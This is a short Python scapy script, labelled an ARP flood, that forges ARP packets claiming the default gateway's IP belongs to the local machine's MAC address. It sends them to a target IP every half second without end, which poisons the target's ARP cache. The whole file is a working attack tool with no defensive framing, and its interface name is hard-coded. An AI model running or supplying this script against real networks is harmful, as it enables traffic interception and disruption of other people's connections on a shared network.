from scapy.all import *
from time import sleep
import time
import sys, subprocess


def arpflood():

    #Getting the Destination IP from the User
    target = input('Enter Destination IP: ')

    #Creating an ARP Packet
    arp_packet = ARP()

    #Grepping the Gateway IP Adddress and setting the Source IP
    gw = subprocess.check_output("ip route list | grep default", shell = True).split()[2][0:]
    arp_packet.psrc = gw

    #Setting the ARP Packet Destination IP
    arp_packet.pdst = target

    #Grepping the MAC Address and setting the Source MAC
    mac = subprocess.check_output("ifconfig wlp44s0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'", shell = True)
    arp_packet.hwsrc = mac


    #Flooding the ARP Packets
    print ('''ARP Flooding''')
    try:
        while 1:
            #Sending the ARP Packet (Request) to the Destination IP
            send(arp_packet, verbose=0)
            sleep(0.5)
    except:
        print ('Exception error')
   
if __name__ == '__main__':
    try:
        arpflood()
    except KeyboardInterrupt:
        print ('KeyBoardInterrupt exception')
